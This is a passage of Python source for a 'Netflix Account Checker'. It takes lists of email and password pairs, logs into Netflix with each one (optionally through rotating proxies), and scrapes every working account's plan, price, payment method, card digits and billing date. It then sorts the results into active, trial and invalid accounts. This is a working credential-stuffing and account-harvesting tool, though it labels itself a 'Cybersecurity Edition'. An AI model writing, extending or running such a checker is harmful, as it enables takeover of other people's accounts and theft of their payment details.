                browse_response = self.session.get('https://www.netflix.com/browse', headers=headers, allow_redirects=True, timeout=20)
                print(f"[*] Browse page status: {browse_response.status_code}", file=sys.stderr)
            except:
                pass
            
            # Fetch account page
            account_response = self.session.get(
                'https://www.netflix.com/account',
                headers=headers,
                timeout=20
            )
            
            if account_response.status_code != 200:
                print(f"[-] Account page status: {account_response.status_code}", file=sys.stderr)
                return None
            
            text = account_response.text
            info = {}
            
            # Pattern matching for account details
            patterns = {
                'PlanName': r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"',
                'videoQuality': r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"',
                'maxStreams': r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}',
                'planPrice': r'"planPrice":\{"fieldType":"String","value":"([^"]+)"',
                'paymentMethod': r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}',
                'paymentType': r'"paymentOptionLogo":"([^"]+)"\}\}]',
                'LastDigit': r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}\}\}]',
                'Expiry': r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}',
                'ExtraMember': r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}',
                'AccountStatus': r'"membershipStatus":"([^"]+)"',
            }
            
            for key, pattern in patterns.items():
                match = re.search(pattern, text)
                if match:
                    value = match.group(1)
                    # Decode unicode escapes if needed
                    if key == 'planPrice':
                        try:
                            value = value.encode().decode('unicode_escape')
                        except:
                            pass
                    elif key == 'Expiry':
                        value = value.replace('\\x20', ' ')
                    
                    info[key] = value
                    print(f"[+] {key}: {value}", file=sys.stderr)
            
            return info if info else None
        
        except Exception as e:
            print(f"[-] Account info extraction error: {str(e)}", file=sys.stderr)
            return None
    
    def check_account(self, email, password):
        """
        Complete account check: fetch login page, extract tokens, authenticate.
        Now uses advanced checking for better results.
        """
        # First try advanced method
        advanced_result = self.check_account_advanced(email, password)
        
        if advanced_result['status'] == 'success':
            return {
                "email": email,
                "status": "authenticated",
                "account_type": "subscription",
                "details": advanced_result
            }
        
        # Fall back to standard method if advanced fails
        check_result = {
            "email": email,
            "status": "unchecked",
            "details": {}
        }
        
        # Step 1: Fetch login page and tokens
        token_data = self.fetch_login_page()
        if not token_data:
            check_result["status"] = "failed"
            check_result["details"]["reason"] = "Could not fetch login page"
            return check_result
        
        check_result["details"]["csrf_extracted"] = token_data["csrf_token"] is not None
        check_result["details"]["initial_cookies"] = len(token_data["cookies"])
        
        # Step 2: Attempt authentication
        csrf_token = token_data.get("csrf_token")
        auth_result = self.authenticate(email, password, csrf_token)
        
        check_result["status"] = "authenticated" if auth_result.get("authenticated") else "invalid"
        check_result["details"].update(auth_result)
        
        return check_result


def format_results_output(subscribed_accounts, free_accounts, invalid_accounts):
    """Format and display results with account-type-specific styling"""
    print("\n" + "="*70)
    print(" "*15 + "Netflix Account Checker Results")
    print("="*70 + "\n")
    
    # Subscribed accounts
    if subscribed_accounts:
        print(f"✅ ACTIVE SUBSCRIPTIONS ({len(subscribed_accounts)})")
        print("-" * 70)
        for account in subscribed_accounts:
            email = account.get("email", "N/A")
            plan = account.get("plan", "N/A")
            expiry = account.get("expiry", "N/A")
            print(f"  📧 {email}")
            print(f"     ├─ Plan: {plan}")
            print(f"     └─ Status: Active")
        print()
    
    # Free trial accounts
    if free_accounts:
        print(f"⚠️  FREE TRIAL ACCOUNTS ({len(free_accounts)})")
        print("-" * 70)
        for account in free_accounts:
            email = account.get("email", "N/A")
            plan = account.get("plan", "Free Trial")
            print(f"  📧 {email}")
            print(f"     └─ Plan: {plan}")
        print()
    
    # Invalid/Non-existent accounts
    if invalid_accounts:
        print(f"❌ INVALID/NON-EXISTENT ({len(invalid_accounts)})")
        print("-" * 70)
        for account in invalid_accounts:
            email = account.get("email", "N/A")
            print(f"  📧 {email} - Account not found or incorrect credentials")
        print()
    
    # Summary
    print("="*70)
    total = len(subscribed_accounts) + len(free_accounts) + len(invalid_accounts)
    print(f"Summary: {len(subscribed_accounts)} Active | {len(free_accounts)} Free | {len(invalid_accounts)} Invalid | Total: {total}")
    print("="*70 + "\n")


def check_account_legacy(email, platform="netflix"):
    """
    checking generic platform accounts.
    """
    url = f"https://{platform}.com/{email}"
    try:
        response = requests.get(url, timeout=5)
        return {
            "platform": platform,
            "email": email,
            "exists": response.status_code == 200,
            "url": url,
            "status_code": response.status_code
        }
    except requests.exceptions.RequestException as e:
        return {
            "platform": platform,
            "email": email,
            "exists": False,
            "url": url,
            "status_code": None,
            "error": str(e)
        }

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Netflix Account Checker with CSRF Token Extraction and Authentication"
    )
    parser.add_argument("accounts_file", help="Path to JSON file with accounts to check")
    parser.add_argument("--mode", choices=["netflix", "legacy"], default="netflix",
                        help="Check mode: 'netflix' for advanced auth, 'legacy' for platform check")
    parser.add_argument("--output", help="Path to save results JSON")
    parser.add_argument("--cookies-dir", default="./cookies", help="Directory to store cookies")
    parser.add_argument("--proxy-file", help="Path to proxy file (one proxy per line)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    print(f"[*] Netflix Checker v2.0 - Cybersecurity Edition", file=sys.stderr)
    print(f"[*] Mode: {args.mode}", file=sys.stderr)
    
    try:
        with open(args.accounts_file, "r") as f:
            accounts = json.load(f)
    except FileNotFoundError:
        print(f"[-] Error: File '{args.accounts_file}' not found", file=sys.stderr)
        sys.exit(1)
    except json.JSONDecodeError:
        print(f"[-] Error: Invalid JSON in '{args.accounts_file}'", file=sys.stderr)
        sys.exit(1)
    
    results = []
    
    if args.mode == "netflix":
        checker = NetflixChecker(
            cookies_dir=args.cookies_dir,
            proxy_file=args.proxy_file
        )
        
        subscribed_accounts = []
        free_accounts = []
        invalid_accounts = []
        
        for account in accounts:
            if isinstance(account, dict):
                email = account.get("email")
                password = account.get("password")
            else:
                email = account
                password = None
            
            if not email or not password:
                print(f"[-] Skipping incomplete account", file=sys.stderr)
                continue
            
            result = checker.check_account(email, password)
            results.append(result)
            
            # Organize results by account type
            account_type = result.get("account_type", "invalid")
            if account_type == "subscription":
                subscribed_accounts.append(result)
            elif account_type == "free":
                free_accounts.append(result)
            else:
                invalid_accounts.append(result)
            
            if args.verbose:
                print(json.dumps(result, indent=2), file=sys.stderr)
    
    else:  # legacy mode
        for account in accounts:
            email = account if isinstance(account, str) else account.get("email", "")
            result = check_account_legacy(email)
            results.append(result)
    
    # Display formatted output for Netflix mode
    if args.mode == "netflix" and results:
        format_results_output(subscribed_accounts, free_accounts, invalid_accounts)
    
    # Save or print results
    if args.output:
        output_path = Path(args.output).expanduser()
        if output_path.is_dir():
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"netflix_checker_results_{timestamp}.json"
            output_path = output_path / filename
        
        try:
            with open(output_path, "w") as f:
                json.dump(results, f, indent=2)
            print(f"[+] Results saved to: {output_path}", file=sys.stderr)
        except IOError as e:
            print(f"[-] Error saving results: {e}", file=sys.stderr)
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()